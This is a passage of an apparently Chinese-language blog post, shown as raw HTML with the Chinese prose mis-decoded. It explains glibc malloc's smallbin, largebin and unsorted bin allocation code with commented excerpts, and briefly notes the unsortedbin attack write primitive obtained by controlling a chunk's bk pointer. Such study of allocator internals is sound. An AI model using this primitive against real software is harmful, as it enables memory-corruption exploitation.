class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œç¨‹åºä¼šé¦–å…ˆç”¨ <code>last (bin)) != bin</code> æ£€æŸ¥ç¬¦åˆç›®æ ‡å¤§å°çš„ smallbin é“¾æ˜¯å¦ä¸ºç©ºã€‚</p><p>ä½†æ˜¯è€ƒè™‘åˆ°ä¸€ç§æƒ…å†µæ˜¯æ²¡åˆå§‹åŒ–ã€‚å½“ small bin æ²¡æœ‰åˆå§‹åŒ–æ—¶ï¼Œæ‰€æœ‰æŒ‡é’ˆå‡ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯ç´§æ¥ç€æ£€æŸ¥çš„ <code>victim == 0</code> ã€‚é‚£å°±è¿›è¡Œåˆå§‹åŒ–æ“ä½œè°ƒç”¨ <code>malloc_consolidate()</code> å‡½æ•°ã€‚</p><p>è¿™ä¸ªå‡½æ•°è¶…çº§é•¿ï¼Œå¤§æ¦‚å®ç°çš„åŠŸèƒ½æ˜¯å…ˆåˆ¤æ–­å †æ˜¯å¦è¢«åˆå§‹åŒ–ã€‚</p><p>å¦‚æœå·²ç»è¢«åˆå§‹åŒ–äº†å°±æŠŠæ‰€æœ‰çš„ <code>fast bin</code>  å–å‡ºæ¥ï¼Œå…ˆæ¸…é™¤å®ƒä»¬çš„æ ‡å¿—ä½ï¼Œç„¶åæ‰”åˆ° unsorted bin ä¸­å°è¯•å‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ï¼›å¦‚æœæ²¡æœ‰åˆå§‹åŒ–å°±è°ƒç”¨ <code>malloc_init_state</code> å’Œ <code>check_malloc_state</code> å‡½æ•°åˆå§‹åŒ–å †ã€‚</p><blockquote><p>å…¶å®å¦‚æœ victim &#x3D;&#x3D; 0 å®ƒä¸€å®šæ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ï¼Œæ‰€ä»¥åˆå¹¶ fastbin é‚£ä¸€éƒ¨åˆ†å¾ˆå°‘æ‰§è¡Œåˆ°ã€‚å¯ä»¥ç†è§£ä¸ºåœ¨è¿™é‡Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥åˆå§‹åŒ– arena çš„ã€‚</p></blockquote><h5 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h5><p>å¦‚æœä¸åœ¨ smallbin é‡Œå°±ä¼šå»æŸ¥æ‰¾ largebin è¾£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>    &#123;<br>      idx = largebin_index (nb);<br>      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        malloc_consolidate (av);<br>    &#125;<br></code></pre></td></tr></table></figure><p>çŸ­çŸ­ä¸‰è¡Œï¼Œ<del>æç®€</del></p><p>å…ˆè·å– largebin å¯¹åº”çš„ indexï¼Œç„¶åå¦‚æœ fastbin ä¸ä¸ºç©ºï¼Œè°ƒç”¨ <code>malloc_consolidate</code> ã€‚</p><p>å› ä¸º largebin éƒ½å·²ç»å­˜åœ¨äº†è‚¯å®šå·²ç»åˆå§‹åŒ–ï¼Œå®<strong>é™…ä¸Šè¿™é‡Œçš„å‡½æ•°ä½œç”¨æ˜¯å°±åªæ˜¯åˆå¹¶ <code>fast bin</code>ï¼Œä½†å¹¶ä¸å† largebin ä¸­å¯»æ‰¾å †å—ã€‚</strong></p><p>ä¹‹å‰ä¸æ˜¯æåˆ°è¯´ <code>fast bin</code> é€šå¸¸ä¸ä¼šå‚ä¸åˆå¹¶ä¸åˆ†å‰²å˜›ï¼Œä½†è¿™å°±æ˜¯ä¸ªä¾‹å¤–ã€‚ä¸¾ä¸ªä¾‹å­ï¼š</p><p>æˆ‘ä»¬æƒ³è¦ç”³è¯·ä¸€å— 0x510 çš„å †å—ï¼ŒåŒæ—¶å†…å­˜åŒºåŸŸä¸­ï¼Œæœ‰ä¸€å— 0x20 çš„ <code>fast bin</code> ä¸ä¸€å— 0x500 çš„ <code>large bin</code> ç›¸é‚»ã€‚æˆ‘ä»¬åˆå¹¶è¿™ä¸¤ä¸ªå †å—å°±èƒ½æ­£å¥½æ»¡è¶³æŠŠä¸€ä¸ª 0x520 çš„ <code>large bin</code> è¿”å›ç»™ç”¨æˆ·ã€‚å¦‚æœä¸åˆå¹¶çš„è¯å°±å¾—é‡æ–°åˆ‡å‰² top_chunk äº†ï¼Œé€ æˆäº†ç©ºé—´æµªè´¹ã€‚</p><h5 id="unsortedbin-å’Œ-largebin"><a href="#unsortedbin-å’Œ-largebin" class="headerlink" title="unsortedbin å’Œ largebin"></a>unsortedbin å’Œ largebin</h5><p><del>unsortedbin éƒ¨åˆ†ï¼Œä¹Ÿå¯èƒ½æ˜¯ smallbinï¼Œä¹Ÿå¯èƒ½æ˜¯ largebins</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-comment">// æ£€æŸ¥ unsortedbin æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºå°±ç»§ç»­</span><br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-comment">// åˆ¤æ–­å½“å‰ç”³è¯·çš„ size æ˜¯å¦åˆæ³•</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          <span class="hljs-comment">// åˆæ³•åˆ™è·å– size</span><br>          size = chunksize (victim);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ while å¾ªç¯å°±æ˜¯å¼€å§‹éå† <code>unsorted chunk</code> äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">//å¦‚æœç”³è¯·çš„å¤§å°åœ¨ smallbin çš„èŒƒå›´ä¸­ï¼Œä¸” unsortedbin é“¾è¡¨ä¸­åªæœ‰ä¸€ä¸ª chunk å¹¶æŒ‡å‘ last_remainderï¼Œä¸”è¯¥ chunk çš„ size å¤§å°å¤§äºç”¨æˆ·ç”³è¯·çš„ size å¤§å°</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>        bck == unsorted_chunks (av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>      &#123;<br>        <span class="hljs-comment">/* split and reattach remainder */</span><br>        <span class="hljs-comment">//æ‹†åˆ† chunkï¼Œæ›´æ–°last_remainder çš„å¤§å°å’Œå¼€å§‹åœ°å€</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset (victim, nb);<br>        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>        <span class="hljs-comment">//åˆ‡å‰²å‡ºå‰©ä¸‹çš„ chunk ä½œä¸ºæ–°çš„ av-&gt;last_remainder</span><br>        av-&gt;last_remainder = remainder;<br>        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>        <span class="hljs-comment">// å¦‚æœ remainder_size çš„å¤§å°ä¸å±äº smallbinï¼Œåˆ™éœ€è¦è®¾ç½® nextsize ä¸ºç©ºï¼Œåé¢ä¼šæŠŠå®ƒä¸¢åˆ° unsortedbin ä¸­</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>          &#123;<br>            remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>            remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br><span class="hljs-comment">//ä¸‹é¢å°±æ˜¯è®¾ç½®å„ç§æ ‡å¿—ä½äº†</span><br>        set_head (victim, nb | PREV_INUSE |<br>                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head (remainder, remainder_size | PREV_INUSE);<br>        set_foot (remainder, remainder_size);<br><br>        check_malloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æœ€å¼€å§‹çš„åˆ¤æ–­è¯¦ç»†æ‹†åˆ†ä¸€ä¸‹å°±æ˜¯ï¼š</p><ul><li><code>in_smallbin_range (nb)</code> ï¼šç”³è¯·çš„å¤§å°åœ¨ small bin çš„èŒƒå›´ä¸­</li><li><code>bck == unsorted_chunks (av)</code> ï¼šunsorted bin ä¸­åªæœ‰ä¸€ä¸ª chunk ã€‚</li><li><code>victim == av-&gt;last_remainder</code>ï¼šè¿™ä¸ª chunk åˆšå¥½æ˜¯æœ€è¿‘è¢«åˆ†å‰²è¿‡çš„å‰©ä½™éƒ¨åˆ†ã€‚</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>ï¼šæ‰¾åˆ°çš„è¿™ä¸ª chunkçš„ <code>size</code> å¤§äºéœ€è¦çš„æœ€å°å—å¤§å°+ <code>MINSIZE</code> ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-comment">//å¦‚æœä¸Šä¸€ä¸ªæ¡ä»¶æ»¡è¶³å°±æ˜¯ chunk è¦è¢«åˆ†é…å‡ºå»äº†æ‰€ä»¥è¦æŠŠè¿™ä¸ª chunk ä» unsortedbin ä¸­è§£é™¤</span><br><span class="hljs-comment">//å› ä¸ºè¿™ä¸ªæŒ‡ä»¤åœ¨ if å¤–æ‰€ä»¥ä¸æ»¡è¶³ä¹Ÿä¼šæ‹¿å‡ºæœ€åä¸€ä¸ª chunk</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>å‰ä¸€ä¸ª if æ¡ä»¶ä¸æ»¡è¶³å°±åˆ°è¿™é‡Œäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><span class="hljs-comment">//å¦‚æœå½“å‰ç”¨æˆ·ç”³è¯·çš„sizeåˆšå¥½ä¸è§£é“¾çš„chunkå¤§å°ç›¸åŒï¼Œåˆ™è¿”å›</span><br>      <span class="hljs-keyword">if</span> (size == nb)<br>        &#123;<br>          set_inuse_bit_at_offset (victim, size);<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>            victim-&gt;size |= NON_MAIN_ARENA;<br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœå–å‡ºçš„è¿™ä¸ª chunk çš„  <code>size</code> åˆšå¥½ç­‰äºè¿™ä¸ª <code>nb</code> ï¼Œé‚£å°±è¯´æ˜è¿™ä¸ªå—ä¸€å®šæ˜¯æœ€åˆé€‚çš„ï¼Œå°±ç›´æ¥è¿”å›ã€‚å¦‚æœä¸åˆé€‚è¿›å…¥ä¸‹é¢çš„éƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//åˆ¤æ–­å–å‡ºçš„è¿™ä¸ª chunk çš„ size å±ä¸å±äº smallbin</span><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>        &#123;<br>          <span class="hljs-comment">//å°†è¯¥chunkæ’å…¥small binä¸­</span><br>          victim_index = smallbin_index (size);<br>          bck = bin_at (av, victim_index);<br>          fwd = bck-&gt;fd;<br>        &#125;<br> <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">//ä¸æ˜¯çš„è¯æ’å…¥ largebin</span><br>          victim_index = largebin_index (size);<br>          bck = bin_at (av, victim_index);<br>          fwd = bck-&gt;fd;<br></code></pre></td></tr></table></figure><p>å±äº smallbin å°±ä¸¢è¿› smallbinï¼Œå¦‚æœä¸å±äºå°±ä¸¢è¿› largebin äº†ã€‚</p><p>è¿™éƒ¨åˆ†ä»£ç æœ€å¼€å§‹å¼€å§‹çš„åˆ¤æ–­å¤§å°ç„¶åä¸¢è¿› largebinã€smallbin çš„éƒ¨åˆ†ï¼Œå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´åˆ†é…è§„åˆ™çš„æ—¶å€™æåˆ°çš„æŠŠ unsortedbin ä¸­çš„å †å—åˆ†ç±»çš„å®ç°ã€‚</p><p>æˆ‘ä»¬ä¸¢è¿›large bin ä¹‹åè¦è®¾ç½®ç›¸åº”çš„æŒ‡é’ˆã€‚large bin ä¸­ä¸€ä¸ª <code>chunk </code> æœ‰å››ä¸ªæŒ‡é’ˆï¼Œæ¯å¯¹é“¾è¡¨å¤´ bin éƒ½ç®¡ç†ä¸€ä¸ªäºŒç»´åŒå‘é“¾è¡¨ï¼Œ<code>fd</code>ã€<code>bk</code> æŒ‡é’ˆä¸ç›¸åŒå¤§å°çš„ chunk è¿æ¥ï¼Œ<code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> ä¸ä¸åŒå¤§å°çš„ <code>chunk</code> è¿æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C">   <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>         <span class="hljs-comment">//è¿™é‡Œçš„ bck æŒ‡çš„æ˜¯è¡¨å¤´ bin æ‰€åœ¨çš„ chunkï¼Œfwd æŒ‡çš„æ˜¯æœ€å¤§çš„ chunkã€‚</span><br><span class="hljs-comment">//æ£€æµ‹ largebin æ˜¯å¦éç©º</span><br>         <span class="hljs-keyword">if</span> (fwd != bck)<br>           &#123;<br>             <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>             <span class="hljs-comment">//å»é™¤ Pæ ‡å¿—ä½</span><br>             size |= PREV_INUSE;<br>             <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>             <span class="hljs-comment">//æ£€æŸ¥Aæ ‡å¿—ä½</span><br>             assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>             <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>               &#123;<br>                 fwd = bck;<br>                 bck = bck-&gt;bk;<br><br>                 victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>               &#125;<br>             <span class="hljs-keyword">else</span><br>               &#123;<br>                 assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                 <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                   &#123;<br>                     fwd = fwd-&gt;fd_nextsize;<br>                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                   &#125;<br><br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                   <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                   fwd = fwd-&gt;fd;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     victim-&gt;fd_nextsize = fwd;<br>                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                     fwd-&gt;bk_nextsize = victim;<br>                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                   &#125;<br>                 bck = fwd-&gt;bk;<br>               &#125;<br>           &#125;<br>         <span class="hljs-comment">//å¦‚æœ largebin ä¸ºç©ºï¼Œé‚£ä¹ˆç›´æ¥åŠ å…¥é“¾è¡¨å°±è¡Œ</span><br>         <span class="hljs-keyword">else</span><br>           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>       &#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ä¸€ä¸ªç©ºçš„ largebin ä¸­æ’å…¥ chunk çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">fwd=bin-&gt;fd;<br>bck=bin-&gt;bk;<br>victim-&gt;bk_nextsize=bck;<br>victim-&gt;fd_nextsize=fwd;<br>fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;<br></code></pre></td></tr></table></figure><p>éç©ºä¹Ÿä¸€æ ·ï¼Œå°±æ˜¯æŠŠ bin çš„æŒ‡é’ˆæ¢æˆå¯¹åº”çš„å‰å chunk çš„æŒ‡é’ˆã€‚</p><p>ä¸­é—´æ²¡æœ‰æ³¨é‡Šçš„é•¿é•¿çš„ä¸€éƒ¨åˆ†éƒ½æ˜¯åœ¨æŸ¥æ‰¾åˆé€‚çš„ä½ç½®æ’å…¥ï¼Œç„¶åä¿®æ”¹æŒ‡é’ˆã€‚å¦‚æœåœ¨å½“å‰çš„ largebin ä¸­æ‰¾åˆ°äº† <code>size</code> ç­‰äºæˆ‘ä»¬å–å‡ºçš„ chunk çš„å †å— <code>size</code> çš„å †å—ï¼Œå°±åªéœ€è¦ä¿®æ”¹ <code>fd</code> å’Œ <code>bk </code>æŒ‡é’ˆï¼›å…¶ä»–æƒ…å†µè¿˜éœ€è¦ä¿®æ”¹ <code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> æŒ‡é’ˆã€‚</p><p>å‰é¢æ‰¾åˆ°äº†æ’å…¥çš„ä½ç½®ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ’å…¥æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å¯¹ unsortedbin çš„éå†æ¯”è¾ƒé•¿ï¼Œæ¯ä¸€æ¬¡ä¾¿åˆ©çš„æµç¨‹å¤§æ¦‚æµç¨‹å°±æ˜¯ï¼š</p><p>æŸ¥æ‰¾ unsortedbin æ˜¯å¦ä¸ºç©ºã€‚ä¸ä¸ºç©ºï¼Œä¸”åªæœ‰ä¸€ä¸ª chunk ä¸”ä¸º last_remainder æ—¶ï¼Œè¿›è¡Œ last_remainder åˆ‡åˆ†åç›´æ¥è¿”å›ï¼›å¦‚æœæœ‰å¤šä¸ª chunk ï¼Œåˆ™éœ€è¦å°† chunk ä» unsortedbin ä¸­è§£é“¾ï¼Œå¦‚æœå¤§å°æ»¡è¶³åˆ™è¿”å›ï¼Œ</p><p>å¦‚æœchunkå¤§å°ä¸æ»¡è¶³ï¼Œè¿›è¡Œåˆ¤æ–­å¯¹åº”ä¸¢è¿› smallbin æˆ– largebin ã€‚</p><p>æ³¨æ„ï¼Œ<strong>å½“å–å¾— unsorted bin chunk ä¸æˆ‘ä»¬ç”³è¯·çš„ chunk å¤§å°ç›¸åŒæ—¶</strong>ï¼Œç¨‹åºè¿›è¡Œäº†å¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-comment">//å°†å½“å‰çš„chunkä»unsortedbin é“¾è¡¨é‡Œè§£é™¤</span><br>unsorted_chunks(av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks(av);<br></code></pre></td></tr></table></figure><p>æ®æ­¤æˆ‘ä»¬å¯ä»¥å‘ç°å¦å¤–ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼Œ<strong>æ§åˆ¶ av çš„ bk æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±èƒ½å‘ bk çš„ fd æŒ‡é’ˆå†™å…¥ av çš„å€¼ï¼Œå‘ç”Ÿ unsortedbin attackã€‚</strong></p><p>æˆ‘ä»¬ä¹‹å‰ä¸æ˜¯éå† unsortedbin åˆæ•´ç†äº†ä¸€ä¸‹ largebin å’Œ smallbin å˜›ï¼Œå¦‚æœåœ¨ unsortebin é‡Œé¢æ²¡æ‰¾åˆ°åˆé€‚çš„å°±ä¼šå†å»æŸ¥æ‰¾ä¸€éè¯·æ±‚ size å¯¹åº”çš„ bin ä¸­çš„ chunk ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">//ç¡®è®¤ç”¨æˆ·ç”³è¯·çš„ chunk å¤§å°ä¸å±äº smallbin</span><br><span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>     &#123;<br>       bin = bin_at (av, idx);<br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-comment">//å¦‚æœ largebin ä¸ä¸ºç©ºï¼Œç”¨æˆ·è¯·æ±‚çš„ size å°äº large bin ä¸­æœ€å¤§çš„ chunk size</span><br>       <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>         &#123;<br>           <span class="hljs-comment">//while å¾ªç¯è·å–åˆšå¥½å°äºç”¨æˆ·è¯·æ±‚çš„ size çš„ large bin</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                   (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>             victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">              list does not have to be rerouted.  */</span><br>           <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>             victim = victim-&gt;fd;<br><br>           <span class="hljs-comment">//æ‹†åˆ†ç¬¦åˆè¦æ±‚çš„ large chunk</span><br>           remainder_size = size - nb;<br>           